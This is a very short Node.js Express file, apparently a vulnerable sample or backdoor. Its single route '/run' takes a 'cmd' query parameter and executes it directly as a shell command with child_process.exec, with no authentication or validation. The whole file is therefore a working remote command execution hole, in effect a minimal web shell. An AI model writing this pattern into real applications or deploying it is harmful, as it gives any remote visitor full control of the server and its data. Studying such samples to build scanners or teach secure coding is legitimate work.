const express = require('express');
const app = express();
app.get('/run', function(req, res) {
    const cmd = req.query.cmd;
    require('child_process').exec(cmd);
});
